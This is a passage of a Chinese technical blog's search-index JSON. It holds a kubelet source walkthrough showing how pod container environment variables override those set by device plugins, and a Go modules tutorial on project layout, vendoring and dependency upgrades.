的处理","uri":"/posts/2022/05/k8s%E5%AF%B9-noschedule-taintnode.kubernetes.io/unschedulable-%E7%9A%84%E5%A4%84%E7%90%86/"},{"categories":["K8S"],"content":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs问题定位分析","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"业务pod的envs如果跟业务平台的预置envs相同，则会引导致业务平台的保留envs被覆盖掉。 ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:0:0","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"背景 场景：如果k8s的插件，如：NVIDIA-GPU插件对业务pod设置了环境变量信息envs（不是插件pod本身的envs），但用户创建业务pod中container也设置了同名envs，则会覆盖掉插件对业务pod设置的envs。 说明：业务pod的envs如果跟业务平台的预置envs相同，则会引导致业务平台的保留envs被覆盖掉。 ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:1:0","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"k8s流程分析 梳理了k8s1.20.5版本的容器相关流程，大概分析下： ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:2:0","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"startContainer 启动容器 // startContainer starts a container and returns a message indicates why it is failed on error. // It starts the container through the following steps: // * pull the image // * create the container // * start the container // * run the post start lifecycle hooks (if applicable) func (m *kubeGenericRuntimeManager) startContainer ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:2:1","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"RunContainerOptions 环境变量envs属于RunContainerOptions // RunContainerOptions specify the options which are necessary for running containers type RunContainerOptions struct { // The environment variables list. // 环境变量 Envs []EnvVar // The mounts for the containers. // 挂载配置 Mounts []Mount // The host devices mapped into the containers. // 资源设备 Devices []DeviceInfo // The annotations for the container // These annotations are generated by other components (i.e., // not users). Currently, only device plugins populate the annotations. Annotations []Annotation // If the container has specified the TerminationMessagePath, then // this directory will be used to create and mount the log file to // container.TerminationMessagePath PodContainerDir string // The type of container rootfs ReadOnly bool // hostname for pod containers Hostname string // EnableHostUserNamespace sets userns=host when users request host namespaces (pid, ipc, net), // are using non-namespaced capabilities (mknod, sys_time, sys_module), the pod contains a privileged container, // or using host path volumes. // This should only be enabled when the container runtime is performing user remapping AND if the // experimental behavior is desired. EnableHostUserNamespace bool } 通过GenerateRunContainerOptions构建opts envs mounts devices // GenerateRunContainerOptions generates the RunContainerOptions, which can be used by // the container runtime to set parameters for launching a container. func (kl *Kubelet) GenerateRunContainerOptions(pod *v1.Pod, container *v1.Container, podIP string, podIPs []string) (*kubecontainer.RunContainerOptions, func(), error) { // 1. 由container mgr获取的资源信息，实际是通过Device plugin mgr获取的插件分配资源信息等 opts, err := kl.containerManager.GetResources(pod, container) // 内置处理，可忽略。。。 opts.Devices = append(opts.Devices, blkVolumes...) // 2. 获取业务pod, container的envs配置 envs, err := kl.makeEnvironmentVariables(pod, container, podIP, podIPs) // 3. 以append方式的合并操作opts.Envs // 注意：envs的排序：k8s资源类的envs在前，业务层：pod、container配置的的envs在后 opts.Envs = append(opts.Envs, envs...) // only podIPs is sent to makeMounts, as podIPs is populated even if dual-stack feature flag is not enabled. mounts, cleanupAction, err := makeMounts(pod, kl.getPodDir(pod.UID), container, hostname, hostDomainName, podIPs, volumes, kl.hostutil, kl.subpather, opts.Envs) return nil, cleanupAction, err } // 4. 以append方式的合并操作opts.Mounts opts.Mounts = append(opts.Mounts, mounts...) } ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:2:2","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"generateContainerConfig 生成容器运行所需配置 startContainer-\u003egenerateContainerConfig 从ContainerOpts到ContainerConfig： ContainerConfig是容器最终使用的配置信息 // generateContainerConfig generates container config for kubelet runtime v1. func (m *kubeGenericRuntimeManager) generateContainerConfig(container *v1.Container, pod *v1.Pod, restartCount int, podIP, imageRef string, podIPs []string, nsTarget *kubecontainer.ContainerID) (*runtimeapi.ContainerConfig, func(), error) { // 1. GenerateRunContainerOptions 生成了了opts.Envs opts, cleanupAction, err := m.runtimeHelper.GenerateRunContainerOptions(pod, container, podIP, podIPs) // config 就是容器运行所需配置，部分信息依赖于RunContainerOptions config := \u0026runtimeapi.ContainerConfig{ Metadata: \u0026runtimeapi.ContainerMetadata{ Name: container.Name, Attempt: restartCountUint32, }, Image: \u0026runtimeapi.ImageSpec{Image: imageRef}, Command: command, Args: args, WorkingDir: container.WorkingDir, Labels: newContainerLabels(container, pod), Annotations: newContainerAnnotations(container, pod, restartCount, opts), Devices: makeDevices(opts), Mounts: m.makeMounts(opts, container), LogPath: containerLogsPath, Stdin: container.Stdin, StdinOnce: container.StdinOnce, Tty: container.TTY, } // 2. 遍历opts.Envs，无内容值校验，直接写config.Envs，会出现覆盖更新 // set environment variables envs := make([]*runtimeapi.KeyValue, len(opts.Envs)) for idx := range opts.Envs { e := opts.Envs[idx] envs[idx] = \u0026runtimeapi.KeyValue{ Key: e.Name, Value: e.Value, } } config.Envs = envs return config, cleanupAction, nil } ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:2:3","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["K8S"],"content":"说明 opts中跟envs类似处理逻辑的还有 opts.Devices -\u003e config.Devices opts.Mounts -\u003e config.Mounts ","date":"2022-04-06","objectID":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/:3:0","tags":["K8S"],"title":"k8s的业务pod环境变量envs覆盖k8s插件devicplugin设置的envs","uri":"/posts/2022/04/k8s%E7%9A%84%E4%B8%9A%E5%8A%A1pod%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fenvs%E8%A6%86%E7%9B%96k8s%E6%8F%92%E4%BB%B6devicplugin%E8%AE%BE%E7%BD%AE%E7%9A%84envs/"},{"categories":["Go"],"content":"Go module相关知识点介绍。 Go版本下载：通过中国大陆的镜像站点 golang.google.cn/dl 来下载 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:0:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"Go 项目结构 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:1:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"Go 可执行程序项目的典型结构布局 可执行程序项目是以构建可执行程序为目的的项目，Go 社区针对这类 Go 项目所形成的典型结构布局是这样的： $tree -F exe-layout exe-layout ├── cmd/ │ ├── app1/ │ │ └── main.go │ └── app2/ │ └── main.go ├── go.mod ├── go.sum ├── internal/ │ ├── pkga/ │ │ └── pkg_a.go │ └── pkgb/ │ └── pkg_b.go ├── pkg1/ │ └── pkg1.go ├── pkg2/ │ └── pkg2.go └── vendor/ 如果 Go 可执行程序项目有一个且只有一个可执行程序要构建，那就比较好办了，我们可以将上面项目布局进行简化： $tree -F -L 1 single-exe-layout single-exe-layout ├── go.mod ├── internal/ ├── main.go ├── pkg1/ ├── pkg2/ └── vendor/ ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:1:1","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"Go 库项目的典型结构布局 Go 库项目仅对外暴露 Go 包，这类项目的典型布局形式是这样的： $tree -F lib-layout lib-layout ├── go.mod ├── internal/ │ ├── pkga/ │ │ └── pkg_a.go │ └── pkgb/ │ └── pkg_b.go ├── pkg1/ │ └── pkg1.go └── pkg2/ └── pkg2.go 我们看到，库类型项目相比于 Go 可执行程序项目的布局要简单一些。因为这类项目不需要构建可执行程序，所以去除了 cmd 目录。 而且，在这里，vendor 也不再是可选目录了。对于库类型项目而言，我们并不推荐在项目中放置 vendor 目录去缓存库自身的第三方依赖，库项目仅通过 go.mod 文件明确表述出该项目依赖的 module 或包以及版本要求就可以了。 Go 库项目的初衷是为了对外部（开源或组织内部公开）暴露 API，对于仅限项目内部使用而不想暴露到外部的包，可以放在项目顶层的 internal 目录下面。当然 internal 也可以有多个并存在于项目结构中的任一目录层级中，关键是项目结构设计人员要明确各级 internal 包的应用层次和范围。 对于有一个且仅有一个包的 Go 库项目来说，我们也可以将上面的布局做进一步简化，简化的布局如下所示： $tree -L 1 -F single-pkg-lib-layout single-pkg-lib-layout ├── feature1.go ├── feature2.go ├── go.mod └── internal/ ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:1:2","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"包依赖管理 Go 程序由 Go 包组合而成的**，Go 程序的构建过程就是确定包版本、编译包以及将编译后得到的目标文件链接在一起的过程。** Go 语言的构建模式历经了三个迭代和演化过程，分别是最初期的 GOPATH、1.5 版本的 Vendor 机制，以及现在的 Go Module。 GOPATH 在这种构建模式下，Go 编译器可以在本地 GOPATH 环境变量配置的路径下，搜寻 Go 程序依赖的第三方包。如果存在，就使用这个本地包进行编译；如果不存在，就会报编译错误。 $go build main.go main.go:3:8: cannot find package \"github.com/sirupsen/logrus\" in any of: /Users/tonybai/.bin/go1.10.8/src/github.com/sirupsen/logrus (from $GOROOT) /Users/tonybai/Go/src/github.com/sirupsen/logrus (from $GOPATH) ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:2:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"Go vendor Go 核心团队在 Go 1.5 版本中做了第一次改进。增加了 vendor 构建机制，也就是 Go 源码的编译可以不在 GOPATH 环境变量下面搜索依赖包的路径，而在 vendor 目录下查找对应的依赖包。 Go 语言项目自身也在 Go 1.6 版本中增加了 vendor 目录以支持 vendor 构建，但 vendor 目录并没有实质性缓存任何第三方包。直到 Go 1.7 版本，Go 才真正在 vendor 下缓存了其依赖的外部包。这些依赖包主要是 golang.org/x 下面的包，这些包同样是由 Go 核心团队维护的，并且其更新速度不受 Go 版本发布周期的影响。 vendor 机制与目录的引入，让 Go 项目第一次具有了可重现构建（Reproducible Build）的能力。 Go Module 机制也保留了 vendor 目录（通过 go mod vendor 可以生成 vendor 下的依赖包，通过 go build -mod=vendor 可以实现基于 vendor 的构建）。 go mod vendor 示例： #hellomodule $ go mod vendor $ ls go.mod go.sum main.exe* main.go vendor/ Go 在 1.5 版本中引入 vendor 机制。vendor 机制本质上就是在 Go 项目的某个特定目录下，将项目的所有依赖包缓存起来，这个特定目录名就是 vendor。 Go 编译器会优先感知和使用 vendor 目录下缓存的第三方包版本，而不是 GOPATH 环境变量所配置的路径下的第三方包版本。这样，无论第三方依赖包自己如何变化，无论 GOPATH 环境变量所配置的路径下的第三方包是否存在、版本是什么，都不会影响到 Go 程序的构建。 如果你将 vendor 目录和项目源码一样提交到代码仓库，那么其他开发者下载你的项目后，就可以实现可重现的构建。因此，如果使用 vendor 机制管理第三方依赖包，最佳实践就是将 vendor 一并提交到代码仓库中。 面这个目录结构就是为上面的代码示例添加 vendor 目录后的结果： . ├── main.go └── vendor/ ├── github.com/ │ └── sirupsen/ │ └── logrus/ └── golang.org/ └── x/ └── sys/ └── unix/ 在添加完 vendor 后，我们重新编译 main.go，这个时候 Go 编译器就会在 vendor 目录下搜索程序依赖的 logrus 包以及后者依赖的 golang.org/x/sys/unix 包了。 这里你还要注意一点，要想开启 vendor 机制，你的 Go 项目必须位于 GOPATH 环境变量配置的某个路径的 src 目录下面。如果不满足这一路径要求，那么 Go 编译器是不会理会 Go 项目目录下的 vendor 目录的。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:3:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"Go Module 一个 Go Module 是一个 Go 包的集合。module 是有版本的，所以 module 下的包也就有了版本属性。这个 module 与这些包会组成一个独立的版本单元，它们一起打版本、发布和分发。 在 Go Module 模式下，通常一个代码仓库对应一个 Go Module。一个 Go Module 的顶层目录下会放置一个 go.mod 文件，每个 go.mod 文件会定义唯一一个 module，也就是说 Go Module 与 go.mod 是一一对应的。 go.mod 文件所在的顶层目录也被称为 module 的根目录，module 根目录以及它子目录下的所有 Go 包均归属于这个 Go Module，这个 module 也被称为 main module。 将基于当前项目创建一个 Go Module，通常有如下几个步骤： 第一步，通过 go mod init 创建 go.mod 文件，将当前项目变为一个 Go Module； 第二步，通过 go mod tidy 命令自动更新当前 module 的依赖信息； 第三步，执行 go build，执行新 module 的构建。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:4:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"demo示例 package main import \"github.com/sirupsen/logrus\" func main() { logrus.Println(\"hello, go module mode\") } $go mod init github.com/bigwhite/module-mode go: creating new go.mod: module github.com/bigwhite/module-mode go: to add module requirements and sums: go mod tidy 现在，go mod init 在当前项目目录下创建了一个 go.mod 文件，这个 go.mod 文件将当前项目变为了一个 Go Module，项目根目录变成了 module 根目录。go.mod 的内容是这样的： module github.com/bigwhite/module-mode go 1.16 这个 go.mod 文件现在处于初始状态，它的第一行内容用于声明 module 路径 (module path)，最后一行是一个 Go 版本指示符，用于表示这个 module 是在某个特定的 Go 版本的 module 语义的基础上编写的。 go mod init 命令还输出了两行日志，提示我们可以使用 go mod tidy 命令，添加 module 依赖以及校验和。go mod tidy 命令会扫描 Go 源码，并自动找出项目依赖的外部 Go Module 以及版本，下载这些依赖并更新本地的 go.mod 文件。我们按照这个提示执行一下 go mod tidy 命令： $go mod tidy go: finding module for package github.com/sirupsen/logrus go: downloading github.com/sirupsen/logrus v1.8.1 go: found github.com/sirupsen/logrus in github.com/sirupsen/logrus v1.8.1 go: downloading golang.org/x/sys v0.0.0-20191026070338-33540a1f6037 go: downloading github.com/stretchr/testify v1.2.2 我们看到，对于一个处于初始状态的 module 而言，go mod tidy 分析了当前 main module 的所有源文件，找出了当前 main module 的所有第三方依赖，确定第三方依赖的版本，还下载了当前 main module 的直接依赖包（比如 logrus），以及相关间接依赖包（直接依赖包的依赖，比如上面的 golang.org/x/sys 等）。 Go Module 还支持通过 Go Module 代理服务加速第三方依赖的下载。提到过 GOPROXY 环境变量，这个环境变量的默认值为“https: // proxy.golang.org,direct”，不过我们可以配置更适合于中国大陆地区的 Go Module 代理服务。如：GOPROXY=https://goproxy.cn 由 go mod tidy 下载的依赖 module 会被放置在本地的 module 缓存路径下，默认值为 $GOPATH[0]/pkg/mod，Go 1.15 及以后版本可以通过 GOMODCACHE 环境变量，自定义本地 module 的缓存路径。 $ go env |grep GOMODCACHE set GOMODCACHE=D:\\GO_projects\\pkg\\mod 执行 go mod tidy 后，我们示例 go.mod 的内容更新如下： module github.com/bigwhite/module-mode go 1.16 require github.com/sirupsen/logrus v1.8.1 你可以看到，当前 module 的直接依赖 logrus，还有它的版本信息都被写到了 go.mod 文件的 require 段中。 而且，执行完 go mod tidy 后，当前项目除了 go.mod 文件外，还多了一个新文件 go.sum，内容是这样的： github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3+rkHYY13jYWTU97c= github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38= github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM= github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4= github.com/sirupsen/logrus v1.8.1 h1:dJKuHgqk1NNQlqoA6BTlM1Wf9DOH3NBjQyu0h9+AZZE= github.com/sirupsen/logrus v1.8.1/go.mod h1:yWOB1SBYBC5VeMP7gHvWumXLIWorT60ONWic61uBYv0= github.com/stretchr/testify v1.2.2 h1:bSDNvY7ZPG5RlJ8otE/7V6gMiyenm9RtJ7IUVIAoJ1w= github.com/stretchr/testify v1.2.2/go.mod h1:a8OnRcib4nhh0OaRAV+Yts87kKdq0PP7pXfy6kDkUVs= golang.org/x/sys v0.0.0-20191026070338-33540a1f6037 h1:YyJpGZS1sBuBCzLAR1VEpK193GlqGZbnPFnPV/5Rsb4= golang.org/x/sys v0.0.0-20191026070338-33540a1f6037/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs= 这同样是由 go mod 相关命令维护的一个文件，它存放了特定版本 module 内容的哈希值。 这是 Go Module 的一个安全措施。当将来这里的某个 module 的特定版本被再次下载的时候，go 命令会使用 go.sum 文件中对应的哈希值，和新下载的内容的哈希值进行比对，只有哈希值比对一致才是合法的，这样可以确保你的项目所依赖的 module 内容，不会被恶意或意外篡改。因此，我推荐你把 go.mod 和 go.sum 两个文件与源码，一并提交到代码版本控制服务器上。 接下来，我们只需在当前 module 的根路径下，执行 go build 就可以完成 module 的构建了！ go build 命令会读取 go.mod 中的依赖及版本信息，并在本地 module 缓存路径下找到对应版本的依赖 module，执行编译和链接。如果顺利的话，我们会在当前目录下看到一个新生成的可执行文件 module-mode，执行这个文件我们就能得到正确结果了。 整个过程的执行步骤是这样的： $go build $ls go.mod go.sum main.go module-mode* $./module-mode INFO[0000] hello, go module mode Go Module 的语义导入版本机制 按照语义版本规范，主版本号不同的两个版本是相互不兼容的。而且，在主版本号相同的情况下，次版本号大都是向后兼容次版本号小的版本。补丁版本号也不影响兼容性。 而且，Go Module 规定：如果同一个包的新旧版本是兼容的，那么它们的包导入路径应该是相同的 语义导入版本机制是 Go Moudle 其他机制的基础，它是通过在包导入路径中引入主版本号的方式，来区别同一个包的不兼容版本。 Go Module 的最小版本选择原则 所以 Go 会在该项目依赖项的所有版本中，选出符合项目整体要求的“最小版本”。 import ( \"github.com/sirupsen/logrus\" logv2 \"github.com/sirupsen/logrus/v2\" ) 思考题是：如何将基于 GOPATH 构建模式的现有项目迁移为使用 Go Module 构建模式？ if go version \u003c 1.13: 项目移出GOPATH/src go env -w GO111MODULE=on go mod init module_path go mod tidy ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:4:1","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"依赖管理 依赖管理的常用场景介绍 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"为当前 module 添加一个依赖 如何为一个 Go Module 添加一个新的依赖包呢？ 如果我们要为这个项目增加一个新依赖：github.com/google/uuid package main import ( // new package uuid \"github.com/google/uuid\" \"github.com/sirupsen/logrus\" ) func main() { logrus.Println(\"hello, go module mode\") logrus.Println(uuid.NewString()) } 执行命令 go mod tidy go module会更新mod文件，并下载依赖包 $go mod tidy go: finding module for package github.com/google/uuid go: found github.com/google/uuid in github.com/google/uuid v1.3.0 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:1","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"升级 / 降级依赖的版本 Go Module 的版本号采用了语义版本规范，也就是版本号使用 vX.Y.Z 的格式。其中 X 是主版本号，Y 为次版本号 (minor)，Z 为补丁版本号 (patch)。主版本号相同的两个版本，较新的版本是兼容旧版本的。如果主版本号不同，那么两个版本是不兼容的。 以上面提到过的 logrus 为例，logrus 现在就存在着多个发布版本，我们可以通过下面命令来进行查询： $go list -m -versions github.com/sirupsen/logrus github.com/sirupsen/logrus v0.1.0 v0.1.1 v0.2.0 v0.3.0 v0.4.0 v0.4.1 v0.5.0 v0.5.1 v0.6.0 v0.6.1 v0.6.2 v0.6.3 v0.6.4 v0.6.5 v0.6.6 v0.7.0 v0.7.1 v0.7.2 v0.7.3 v0.8.0 v0.8.1 v0.8.2 v0.8.3 v0.8.4 v0.8.5 v0.8.6 v0.8.7 v0.9.0 v0.10.0 v0.11.0 v0.11.1 v0.11.2 v0.11.3 v0.11.4 v0.11.5 v1.0.0 v1.0.1 v1.0.3 v1.0.4 v1.0.5 v1.0.6 v1.1.0 v1.1.1 v1.2.0 v1.3.0 v1.4.0 v1.4.1 v1.4.2 v1.5.0 v1.6.0 v1.7.0 v1.7.1 v1.8.0 v1.8.1 在这个例子中，基于初始状态执行的 go mod tidy 命令，帮我们选择了 logrus 的最新发布版本 v1.8.1。如果你觉得这个版本存在某些问题，想将 logrus 版本降至某个之前发布的兼容版本，比如 v1.7.0， 有2种方式可以选择： 那么我们可以在项目的 module 根目录下，执行带有版本号的 go get 命令： $go get github.com/sirupsen/logrus@v1.7.0 go: downloading github.com/sirupsen/logrus v1.7.0 go get: downgraded github.com/sirupsen/logrus v1.8.1 =\u003e v1.7.0 从这个执行输出的结果，我们可以看到，go get 命令下载了 logrus v1.7.0 版本，并将 go.mod 中对 logrus 的依赖版本从 v1.8.1 降至 v1.7.0。 当然我们也可以使用万能命令 go mod tidy 来帮助我们降级，但前提是首先要用 go mod edit 命令，明确告知我们要依赖 v1.7.0 版本，而不是 v1.8.1，这个执行步骤是这样的： $go mod edit -require=github.com/sirupsen/logrus@v1.7.0 $go mod tidy go: downloading github.com/sirupsen/logrus v1.7.0 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:2","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"添加一个主版本号大于 1 的依赖 语义导入版本机制有一个原则：如果新旧版本的包使用相同的导入路径，那么新包与旧包是兼容的。也就是说，如果新旧两个包不兼容，那么我们就应该采用不同的导入路径。 按照语义版本规范，如果我们要为项目引入主版本号大于 1 的依赖，比如 v2.0.0，那么由于这个版本与 v1、v0 开头的包版本都不兼容，我们在导入 v2.0.0 包时，不能再直接使用 github.com/user/repo，而要使用像下面代码中那样不同的包导入路径： import github.com/user/repo/v2/xxx 也就是说，如果我们要为 Go 项目添加主版本号大于 1 的依赖，我们就需要使用“语义导入版本”机制，在声明它的导入路径的基础上，加上版本号信息。我们以“向 module-mode 项目添加 github.com/go-redis/redis 依赖包的 v7 版本”为例，看看添加步骤。 首先，我们在源码中，以空导入的方式导入 v7 版本的 github.com/go-redis/redis 包： package main import ( // 添加 github.com/go-redis/redis 依赖包的 v7 版本 _ \"github.com/go-redis/redis/v7\" \"github.com/google/uuid\" \"github.com/sirupsen/logrus\" ) func main() { logrus.Println(\"hello, go module mode\") logrus.Println(uuid.NewString()) } 接下来的步骤就与添加兼容依赖一样，我们通过 go get 或者 go mod edit + tidy 获取 redis 的 v7 版本： $go get github.com/go-redis/redis/v7 go: downloading github.com/go-redis/redis/v7 v7.4.1 go: downloading github.com/go-redis/redis v6.15.9+incompatible go get: added github.com/go-redis/redis/v7 v7.4.1 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:3","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"升级依赖版本到一个不兼容版本 按照语义导入版本的原则，不同主版本的包的导入路径是不同的。所以，同样地，我们这里也需要先将代码中 redis 包导入路径中的版本号改为 v8： import ( // 将代码中 redis 包导入路径中的版本号改为 v8 _ \"github.com/go-redis/redis/v8\" \"github.com/google/uuid\" \"github.com/sirupsen/logrus\" ) 接下来的步骤就与添加兼容依赖一样，我们通过 go get 或者 go mod edit + tidy 获取 redis 的 v8版本 $go get github.com/go-redis/redis/v8 go: downloading github.com/go-redis/redis/v8 v8.11.1 go: downloading github.com/dgryski/go-rendezvous v0.0.0-20200823014737-9f7001d12a5f go: downloading github.com/cespare/xxhash/v2 v2.1.1 go get: added github.com/go-redis/redis/v8 v8.11.1 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:4","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"移除一个依赖 代码中删除go-redis/redis/v8，通过 go list 命令列出当前 module 的所有依赖，你也会发现 go-redis/redis/v8 仍出现在结果中： $go list -m all github.com/bigwhite/module-mode github.com/cespare/xxhash/v2 v2.1.1 github.com/davecgh/go-spew v1.1.1 ... ... github.com/go-redis/redis/v8 v8.11.1 ... ... gopkg.in/yaml.v2 v2.3.0 用 go mod tidy 